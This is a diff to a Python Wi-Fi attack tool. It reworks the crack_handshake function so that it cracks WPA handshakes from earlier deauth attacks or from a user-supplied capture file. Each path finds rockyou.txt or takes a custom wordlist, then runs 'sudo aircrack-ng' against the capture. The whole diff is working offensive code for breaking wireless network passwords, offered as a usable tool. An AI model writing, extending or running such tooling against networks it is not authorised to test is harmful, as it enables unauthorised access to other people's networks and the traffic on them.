@@ -308,83 +308,165 @@ def run_command(commands):
     else:
         commands = commands.replace(" False", "")
         subprocess.run(commands.split(' '), capture_output=True)
+        
 
 
 def crack_handshake():
     global deauth_attack_performed
     global wifi_cracker_directory
     global cracked_networks
+    c_a_n = False # crack_attacked_networks
+    cap_file = False # captured file
 
     files_found = []
 
-    if deauth_attack_performed == False:
-        print('\x1b[91m'+'[-] Please perform an attack and try again')
-        return
-    
-    directory_contents = os.listdir(wifi_cracker_directory)
+    while True:
+        print('\n'+'\x1b[94m'+' (1) Crack attacked networks')
+        print('\x1b[94m'+' (2) Crack captured network file')
+        action = input('\x1b[93m' + '\n[*] Select an option (enter option no): ')
+        try:
+            action = int(action)
+            if action == 1:
+                c_a_n = True
+                break
+            elif action == 2:
+                cap_file = True
+                break
+            else:
+                print('\x1b[91m' + "[-] Invalid option")    
+        except:
+            print('\x1b[91m' + "[-] Invalid option")
 
-    for network_cracked in cracked_networks:
-        for file in directory_contents:
-            if network_cracked in file:
-                files_found.append(network_cracked)
-                break
-    if len(files_found) == 0:
-        print('\n[*] No Attacked Network Files found: ')
-        print('[*] Returning to Main Menu...')
-        time.sleep(2)
-        return
-    else:
-        while True:
-            counter = 1
-            print('\x1b[93m'+'[*] Attacked Networks Found:\n')
-            for file in files_found:
-                print('\x1b[94m'+' (' + str(counter) + ') ' + file)
-                counter += 1
-            network_to_crack = input('\x1b[93m'+'\n[*] Enter a network no or "back" to return to Main Menu [Note: This only works if the handshake was captured during the attack] : ')
-            try:
-                network_to_crack =  int(network_to_crack)
-                network_selected = files_found[network_to_crack-1]
-                break
-            except:
-                network_to_crack = str(network_to_crack)
-                if network_to_crack.lower() == "back":
-                    return
-                else:
-                    print('\x1b[91m'+'[-] Invalid no')
+    if c_a_n:
+        if deauth_attack_performed == False:
+            print('\x1b[91m'+'[-] Please perform an attack and try again')
+            print('\x1b[93m'+'[*] Returning to Main menu...')
+            return
         
-        no_of_nework_files_found = 0
-        for file in directory_contents:
-            if network_selected in file:
-                no_of_nework_files_found += 1
+        directory_contents = os.listdir(wifi_cracker_directory)
 
-        # Set file name
-        if no_of_nework_files_found <= 9:
-            file_to_crack = wifi_cracker_directory+network_selected+'-0'+str(no_of_nework_files_found)+'.cap'
+        for network_cracked in cracked_networks:
+            for file in directory_contents:
+                if network_cracked in file:
+                    files_found.append(network_cracked)
+                    break
+        if len(files_found) == 0:
+            print('\n[*] No Attacked Network Files found: ')
+            print('[*] Returning to Main Menu...')
+            time.sleep(2)
+            return
         else:
-            file_to_crack = wifi_cracker_directory+network_selected+'-'+str(no_of_nework_files_found)+'.cap'
+            while True:
+                counter = 1
+                print('\x1b[93m'+'[*] Attacked Networks Found:\n')
+                for file in files_found:
+                    print('\x1b[94m'+' (' + str(counter) + ') ' + file)
+                    counter += 1
+                network_to_crack = input('\x1b[93m'+'\n[*] Enter a network no or "back" to return to Main Menu [Note: This only works if the handshake was captured during the attack] : ')
+                try:
+                    network_to_crack =  int(network_to_crack)
+                    network_selected = files_found[network_to_crack-1]
+                    break
+                except:
+                    network_to_crack = str(network_to_crack)
+                    if network_to_crack.lower() == "back":
+                        return
+                    else:
+                        print('\x1b[91m'+'[-] Invalid no')
+            
+            no_of_nework_files_found = 0
+            for file in directory_contents:
+                if network_selected in file:
+                    no_of_nework_files_found += 1
 
+            # Set file name
+            if no_of_nework_files_found <= 9:
+                file_to_crack = wifi_cracker_directory+network_selected+'-0'+str(no_of_nework_files_found)+'.cap'
+            else:
+                file_to_crack = wifi_cracker_directory+network_selected+'-'+str(no_of_nework_files_found)+'.cap'
+
+            get_rockyou_path = subprocess.run(['locate', 'rockyou.txt'], capture_output=True, text=True)
+            paths_returned = get_rockyou_path.stdout.splitlines()
+            found = False
+            for line in paths_returned:
+                if 'rockyou.txt' in line:
+                    print('\x1b[92m'+'[+] rockyou.txt found')
+                    path = line
+                    found = True
+                    break
+            if found == False:
+                print('\x1b[91m'+'[-] rockyou.txt not found')
+            
+            crack_with_custom_dict = False
+            if found:
+                while True:
+                    crack_with_rockyou = input('\x1b[93m'+'\n[*] Do you want to crack with rockyou.txt (Y/N): ')
+                    if crack_with_rockyou.lower() == 'y':
+                        # Crack File
+                        print("\n[*] Network selected: " + network_selected)
+                        print("[*] Cracking last attack on " + network_selected + ' with rockyou.txt')
+                        print('\x1b[92m')
+                        time.sleep(3)
+                        subprocess.run(['sudo', 'aircrack-ng', file_to_crack, '-w', path], text=True)
+                        break
+                    elif crack_with_rockyou.lower() == 'n':
+                        crack_with_custom_dict = True
+                        break
+                    else:
+                        print('\x1b[91m'+'[-] Invalid option')
+                        continue
+            
+            if (crack_with_custom_dict == True) or (found == False):
+                while True:
+                    get_custom_dict = input('\x1b[93m'+'\n[*] Enter path to dictionary: ')
+                    verify_path = os.path.isfile(get_custom_dict)
+                    if verify_path:
+                        print("\n[*] Network selected: " + network_selected)
+                        print("[*] Cracking last attack on " + network_selected + ' with ' + get_custom_dict.split('/')[-1])
+                        print('\x1b[92m')
+                        time.sleep(3)
+                        subprocess.run(['sudo', 'aircrack-ng', file_to_crack, '-w', get_custom_dict], text=True)
+                        break
+                    else:
+                        print('\x1b[91m'+'[-] The Path provided is not valid')
+                        
+
+            print('\x1b[93m'+'[*] Returning to Main menu...')
+            time.sleep(2)
+
+    if cap_file:
+        while True:
+            network_file_path = input('\x1b[93m'+'\n[*] Enter path to network file [.cap, .pcap, .hccapx]: ')
+            verify_net_file_path = os.path.isfile(network_file_path)
+            if verify_net_file_path:
+                break 
+            else:
+                print('\x1b[91m'+'[-] The Path provided is not valid')
+        
+        # Find rockyou.txt
         get_rockyou_path = subprocess.run(['locate', 'rockyou.txt'], capture_output=True, text=True)
         paths_returned = get_rockyou_path.stdout.splitlines()
         found = False
         for line in paths_returned:
             if 'rockyou.txt' in line:
-                print('\x1b[92m'+'[+] rockyou.txt dictionary found')
+                print('\x1b[92m'+'[+] rockyou.txt found')
                 path = line
                 found = True
                 break
         if found == False:
-            print('\x1b[91m'+'[-] rockyou.txt dictionary not found')
-        
+            print('\x1b[91m'+'[-] rockyou.txt not found')
+
         crack_with_custom_dict = False
         if found:
             while True:
                 crack_with_rockyou = input('\x1b[93m'+'\n[*] Do you want to crack with rockyou.txt (Y/N): ')
                 if crack_with_rockyou.lower() == 'y':
                     # Crack File
-                    print("\n[*] Network selected: " + network_selected)
-                    print("[*] Cracking last attack on " + network_selected + ' with rockyou.txt')
-                    time.sleep(2)
-                    subprocess.run(['sudo', 'aircrack-ng', file_to_crack, '-w', path], text=True)
+                    print("\n[*] File selected: " + network_file_path.split('/')[-1])
+                    print("[*] Cracking " + network_file_path.split('/')[-1] + ' with rockyou.txt')
+                    print('\x1b[92m')
+                    time.sleep(3)
+                    subprocess.run(['sudo', 'aircrack-ng', network_file_path, '-w', path], text=True)
                     break
                 elif crack_with_rockyou.lower() == 'n':
                     crack_with_custom_dict = True
@@ -395,17 +477,17 @@ def crack_handshake():
         
         if (crack_with_custom_dict == True) or (found == False):
             while True:
-                get_custom_dict = input('\x1b[93m'+'\n[*] Please enter path to dictionary: ')
+                get_custom_dict = input('\x1b[93m'+'\n[*] Enter path to dictionary: ')
                 verify_path = os.path.isfile(get_custom_dict)
                 if verify_path:
-                    print("\n[*] Network selected: " + network_selected)
-                    print("[*] Cracking last attack on " + network_selected + ' with ' + get_custom_dict.split('/')[-1])
-                    time.sleep(4)
-                    subprocess.run(['sudo', 'aircrack-ng', file_to_crack, '-w', get_custom_dict], text=True)
+                    print("\n[*] File selected: " + network_file_path.split('/')[-1])
+                    print("[*] Cracking " + network_file_path.split('/')[-1] + ' with ' + get_custom_dict.split('/')[-1])
+                    print('\x1b[92m')
+                    time.sleep(3)
+                    subprocess.run(['sudo', 'aircrack-ng', network_file_path, '-w', get_custom_dict], text=True)
                     break
                 else:
                     print('\x1b[91m'+'[-] The Path provided is not valid')
-                    
 
         print('\x1b[93m'+'[*] Returning to Main menu...')
         time.sleep(2)
